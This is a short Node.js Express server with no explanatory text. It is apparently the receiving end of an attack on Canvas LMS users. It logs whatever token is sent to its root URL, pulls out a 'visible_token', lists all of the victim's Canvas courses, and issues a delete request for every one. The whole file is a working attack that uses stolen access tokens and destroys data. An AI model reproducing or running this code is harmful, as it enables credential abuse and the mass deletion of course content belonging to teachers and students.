const express=require("express");
const app=express();
const request=require("request-promise");
app.get("/",(req,res)=>{
  console.log(req.query.d);
  deleteAllCourses(req.query.d);
  res.send();
});
async function deleteAllCourses(id){
  const token=JSON.parse(id).visible_token;
  const courseList=JSON.parse(await request.get("https://canvas.instructure.com/api/v1/courses?access_token="+encodeURIComponent(token)));
  const courseIds=Object.values(courseList).map(i=>i.id);
  courseIds.forEach(id=>request.delete("https://canvas.instructure.com/api/v1/courses/"+id+"?access_token="+encodeURIComponent(token),{form:{event:"delete"}}));
}
app.listen(process.env.PORT||3000,()=>console.log("server started"));
